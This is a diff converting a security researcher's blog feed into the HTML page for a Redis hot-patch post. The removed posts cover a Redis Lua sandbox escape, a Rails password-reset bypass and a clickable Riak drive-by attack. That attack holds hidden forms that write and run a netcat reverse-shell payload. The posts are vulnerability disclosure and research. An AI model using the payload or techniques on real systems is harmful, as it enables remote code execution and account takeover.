@@ -1,25 +1,109 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Ben's Blog]]></title>
-  <link href="http://benmmurphy.github.com/atom.xml" rel="self"/>
-  <link href="http://benmmurphy.github.com/"/>
-  <updated>2015-06-15T12:06:54+01:00</updated>
-  <id>http://benmmurphy.github.com/</id>
-  <author>
-    <name><![CDATA[Ben Murphy]]></name>
-    
-  </author>
-  <generator uri="http://octopress.org/">Octopress</generator>
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Redis Hot Patch - Ben's Blog</title>
+  <meta name="author" content="Ben Murphy">
 
   
-  <entry>
-    <title type="html"><![CDATA[Redis Hot Patch]]></title>
-    <link href="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/"/>
-    <updated>2015-06-09T09:53:00+01:00</updated>
-    <id>http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch</id>
-    <content type="html"><![CDATA[<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.</p>&mdash; Salvatore Sanfilippo (@antirez) <a href="https://twitter.com/antirez/status/606440338102689792">June 4, 2015</a></blockquote>
-<script async src="http://benmmurphy.github.com//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
+  <meta name="description" content="If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.&mdash; Salvatore Sanfilippo (@ &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Ben's Blog" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-31750008-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ben's Blog</a></h1>
+  
+    <h2>Developer Musings</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:benmmurphy.github.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Redis Hot Patch</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-09T09:53:00+01:00" pubdate data-updated="true">Jun 9<span>th</span>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.</p>&mdash; Salvatore Sanfilippo (@antirez) <a href="https://twitter.com/antirez/status/606440338102689792">June 4, 2015</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
 
 
 <p>The arbitrary read and arbitrary write from the <a href="https://gist.github.com/corsix/6575486">Lua vulnerability</a> makes it quite easy to patch the vulnerability itself. I have written a proof of concept that should work on OSX Yosemite with any of the Homebrew bottled Redis versions that are vulnerable. It should also work on Mavericks and other compiled versions of Redis but I have not tested it on them (on versions other than Yosemite it may crash if the format of the long jump buffer is not the same). The Hot Patcher looks for the instruction <a href="https://github.com/antirez/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411#diff-9486950b94262375ea8951aecc31b93cL498">cmp r15, 0x1b</a> and replaces it with &#8216;cmpq rsp,0x1b&#8217;. This comparison should never be true because the stack typically lives around 0x7fxxxxxxxxxxxxxx and will never reach such a low address. However, looking for this exact instruction makes the patcher quite brittle and it may not work on Redis versions compiled with different compilers.</p>
@@ -2690,579 +2774,176 @@
 
 
 
-]]></content>
-  </entry>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
   
-  <entry>
-    <title type="html"><![CDATA[Redis EVAL Lua Sandbox Escape]]></title>
-    <link href="http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape/"/>
-    <updated>2015-06-04T09:52:00+01:00</updated>
-    <id>http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape</id>
-    <content type="html"><![CDATA[<p>It is possible to break out of the Lua sandbox in Redis and execute arbitrary
-code. This vulnerability is not new and is heavily based on
-<a href="https://www.youtube.com/watch?v=OSMOTDLrBCQ">Peter Cawley&#8217;s work</a> with Lua bytecode
-<a href="https://gist.github.com/corsix/6575486">type confusion</a>.</p>
 
-<p>This shouldn&#8217;t pose a threat to users under the trusted Redis security model
-where only trusted users can connect to the database. However, in real
-deployments there could be databases that can be accessed by untrusted users.
-The main deployments that are vulnerable are developers machines, places where
-redis servers can be reached via SSRF attacks and cloud hosting.</p>
+<span class="byline author vcard">Posted by <span class="fn">Ben Murphy</span></span>
 
-<p><a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a> have been released to fix this issue.</p>
+      
 
-<h1>Vulnerable Deployments</h1>
 
-<h2>Developers Machines</h2>
 
-<p>Developers machines may be vulnerable because they bind Redis to all interfaces
-which used to be the default listen directive in the Redis configuration.</p>
 
-<p>Developers may also be vulnerable even if they bind to 127.0.0.1 because Redis
-is effectively a HTTP server. The first mention of attacking Redis via HTTP I
-could find is by <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Nicolas Grégoire</a>
-where he documents attacking a Redis server on a Facebook property using a SSRF
-vulnerability.</p>
 
-<p>Because Redis is a HTTP server the same origin policies of browsers will allow
-any website on the internet to send a POST request to it. When using XHR the
-body is completely controllable. For example if you run the following in the
-console of your webbrowser while running wireshark:</p>
 
-<pre><code>var x = new XMLHttpRequest();
-x.open("POST", "http://127.0.0.1:6379");
-x.send('eval "print(\\"hello\\")" 0\r\n');
-</code></pre>
 
-<p>In wireshark you will see:</p>
 
-<pre><code>POST / HTTP/1.1
-Host: 127.0.0.1:6379
-Connection: keep-alive
-Content-Length: 27
-Pragma: no-cache
-Cache-Control: no-cache
-Origin: http://www.agarri.fr
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
-Content-Type: text/plain;charset=UTF-8
-Accept: */*
-Referer: http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.8
-
-eval "print(\"hello\")" 0
--ERR unknown command 'POST'
--ERR unknown command 'Host:'
--ERR unknown command 'Connection:'
--ERR unknown command 'Content-Length:'
--ERR unknown command 'Pragma:'
--ERR unknown command 'Cache-Control:'
--ERR unknown command 'Origin:'
--ERR unknown command 'User-Agent:'
--ERR unknown command 'Content-Type:'
--ERR unknown command 'Accept:'
--ERR unknown command 'Referer:'
--ERR unknown command 'Accept-Encoding:'
--ERR unknown command 'Accept-Language:'
-$-1
-</code></pre>
-
-<p>And in the stdout for Redis you will see:</p>
-
-<pre><code>hello
-</code></pre>
-
-<p>The attacker is not able to read the response from the server because of the
-same origin policy. However, this might be worked around by using a <a href="https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/">DNS rebinding attack</a>.
-Even with DNS rebinding it might not be possible to read the response because
-the response is not valid HTTP.</p>
-
-<p>However, reading the response is not necessary because you can package a super generic
-exploit that checks the result of the redis.call(&#8220;INFO&#8221;) command and then
-launches a OS/architecture specific payload.</p>
-
-<h2>SSRF attacks</h2>
-
-<p>This is similar to attacking developers except a trusted server is tricked into
-making a request to the Redis server However, you need a lot of control over
-the body which might not often be possible depending on how the body is encoded.</p>
-
-<h2>Redis Cloud Hosting</h2>
-
-<p>This will only effect providers where people running arbitrary code from the
-Redis process is not part of their threat model. The major players in this area
-look like they are using sandboxing. For example the pids returned by &#8216;INFO&#8217; on
-heroku are very low &lt;10 which indicates they are running the Redis servers in
-containers. You can already run arbitrary code in containers via dynos on Heroku
-so running arbitrary code in a Redis container is probably not useful for an
-attacker. Amazon Elasticcache also looks like it uses linux containers.</p>
-
-<p>Similarily, it looks like Microsoft&#8217;s hosted Redis solution runs in an
-isolated VM. Redis &#8216;INFO&#8217; returns a virtual os string and it takes ~15
-minutes to launch an instance. If MS aren&#8217;t running in an isolated VM then the
-15 minute startup time is very weird.</p>
-
-<p>This will be a problem if a hosting provider runs a whole bunch of redis
-processes on the same machine/same VM from different customers without any
-kind of isolation.</p>
-
-<h1>Exploit</h1>
-
-<p><a href="https://gist.github.com/corsix/6575486">Peter Cawley</a> has found that the
-loadstring function can be used to load bytecode that is unsafe. He has
-created three very useful lua exploit primitives that make exploitation easy.</p>
-
-<p>First is a way of reading the Value contained in a TValue struct. This allows
-reading the pointer value from a lua tagged value. Some pointer values are
-already public (using tostring) but there doesn&#8217;t seem to be a way to get the
-pointer value for a lua string so this is useful.</p>
-
-<p>Second is a way of reading 8 bytes from an arbitrary memory address.</p>
-
-<p>Third is a way of writing 8 bytes to an arbitrary memory address.</p>
-
-<p>Using the arbitrary memory read it is possible to leak the address of a known
-C function. From the address of this c-function it is possible to find the base
-address of the redis-server binary. From this base address it is possible to
-find pointers to libc/libsystem_c functions and to find the base address of the
-libc/libsystem_c libraries. From these libraries it is possible to find the
-addresses of useful exported functions (longjump/system) and ROP gadgets. This
-technique is similar to pwntools <a href="http://pwntools.readthedocs.org/en/latest/dynelf.html">dynelf</a></p>
-
-<p>The arbitrary memory read is also used to leak an address inside the stack. The
-lua_State object holds a long_jump variable that references a long_jump buffer
-that is allocated on the stack. This leaks the stack address which can be useful
-if you just want to corrupt the stack or the rsp and rip can be overwritten in
-the longjump buf to directly take control when longjump is called. OSX has no
-pointer mangling protections so this is quite easy to corrupt.</p>
-
-<p>On linux the rip and rsp (and rbp) values are mangled. However, if you have full
-read access to the memory you can reverse the secret cookie value to corrupt
-the values. Also, linux prevents you from longjmp&#8217;ing to an invalid stack frame
-(ie: the heap) but you can longjump to point the stack inside the longjump
-buffer then pivot the stack into the heap. This is not really necessary if you
-don&#8217;t care about corrupting the stack and crashing the redis process but if you
-longjump and don&#8217;t corrupt the stack then you can resume normal execution of
-redis after the exploit has finished running.</p>
-
-<h1>Exploitability</h1>
-
-<p>I have exploits for Linux 64 bit and OSX 64 bit. Both exploits take care to not
-crash the redis server during successful execution. They will make a call to
-system() then go back to normal redis execution.</p>
-
-<p>I have run the Linux exploit on the Amazon RHEL Image (PIE enabled) and the
-Amazon 14.04 Ubuntu Image (no PIE). I believe the exploit will work on most
-modern Linux 64 bit systems (I suspect it will not work if you compile libc with
- fomit-frame-pointer but this can be worked around). It does not use any
-hardcoded addresses from libc or the Redis binary.</p>
-
-<p>The OSX version I have only tested on Yosemite but an earlier version was
-working on Mavericks and I believe the Yosemite version works on both. This has
-been tested with two different Redis versions and similarily does not depend on
-hardcoded address from libsystem_c or the Redis binary. However, it uses
-addresses from libsystem_c to speed up the exploit.</p>
-
-<h1>Workarounds</h1>
-
-<p>The best option is to set a strong password on Redis. Systems that are reachable
-via HTTP without a password are a problem waiting to happen.</p>
-
-<p>It is also possible to rename the EVAL command. If you are not using EVAL this
-is a good option but you still might be at risk of someone modifying your Redis
-data via HTTP SSRF attacks.</p>
-
-<p>Upgrading to <a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a>
-will also fix this issue but I still strongly recommend using password
-authentication on Redis systems.</p>
-]]></content>
-  </entry>
   
-  <entry>
-    <title type="html"><![CDATA[Riak Drive by Attack]]></title>
-    <link href="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/"/>
-    <updated>2013-09-01T21:29:00+01:00</updated>
-    <id>http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack</id>
-    <content type="html"><![CDATA[<h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>
-
-<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>
-
-<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>
-
-<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>
-
-<p>The attack will perform the following actions</p>
-
-<ol>
-<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
-<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
-<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
-</ol>
 
 
-<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>
-
-<p>Click ‘Hack Me’ below to start the attack.</p>
-
-<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>
+<time datetime="2015-06-09T09:53:00+01:00" pubdate data-updated="true">Jun 9<span>th</span>, 2015</time>
+      
 
 
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/" title="Previous Post: Redis EVAL Lua Sandbox Escape">&laquo; Redis EVAL Lua Sandbox Escape</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/06/09/redis-hot-patch/">Redis Hot Patch</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/">Redis EVAL Lua Sandbox Escape</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/09/01/riak-drive-by-attack/">Riak Drive by Attack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/">Abusing Dynamic Types For Fun And Profit</a>
+      </li>
+    
+  </ul>
+</section>
 
 
-<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
-  <input name='lols' type='hidden' value='lols' />
-</form></p>
-
-
-
-
-<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
-</form></p>
-
-
-
-
-<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
-</form>
-<input id='hack_me' type='button' value='Hack Me' /></p>
-
-
-
-
-<script type='text/javascript'>
-  //&lt;![CDATA[
-    $("#hack_me").click(function() {
-        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
-            $("#insert_record_form")[0].submit();
-            setTimeout(write_file, 1000);
-        }
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("benmmurphy", 4, false);
     });
-    
-    function write_file() {
-        $("#write_file_form")[0].submit();
-        setTimeout(evaluate_file, 1000);           
-    }
-    
-    function evaluate_file() {
-        $("#evaluate_file_form")[0].submit();          
-    }
-  //]]&gt;
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/benmmurphy" class="twitter-follow-button" data-show-count="false">Follow @benmmurphy</a>
+  
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Ben Murphy -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'benmmurphy';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/';
+        var disqus_url = 'http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
 </script>
 
 
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Abusing Dynamic Types For Fun And Profit]]></title>
-    <link href="http://benmmurphy.github.com/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/"/>
-    <updated>2012-05-15T11:39:00+01:00</updated>
-    <id>http://benmmurphy.github.com/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit</id>
-    <content type="html"><![CDATA[<p>Most Rails applications don&#8217;t properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I&#8217;m going to use an example to illustrate this problem.</p>
-
-<h2>The Scenario</h2>
-
-<p>Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like <code>/users/1/passwords/edit?reset_token=kjksldjflskdjf</code>. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
 
 
-<p>Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url <code>/users/2/passwords/edit</code> and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.</p>
 
-<p>Johnny reproduces the problem on his machine and notices it is is doing the following query:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
-</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">reset_token</span><span class="sb">` IS NULL LIMIT 1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>He realises he needs to stop users from not sending the reset_token parameter because if <code>params[:reset_token]</code> is <code>nil</code> then they can update any user who hasn&#8217;t requested a password reset. He updates the code in PasswordController to the following:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
 
 
-<p>Mary tries her trick again but it doesn&#8217;t work this time. But Mary has more tricks in her bag and this time she uses the url <code>/users/2/passwords/edit?reset_token[]</code> . Again she is able to change the password for any user that has not had a reset_token generated.</p>
 
-<p>Johnny reproduces the problem on his machine and sees it doing the same query:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
-</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">reset_token</span><span class="sb">` IS NULL LIMIT 1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the <code>params[:reset_token]</code> is actually an array containing a nil element: <code>[nil]</code>. He decides to fix the problem by calling <code>to_s</code> on the query parameters.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
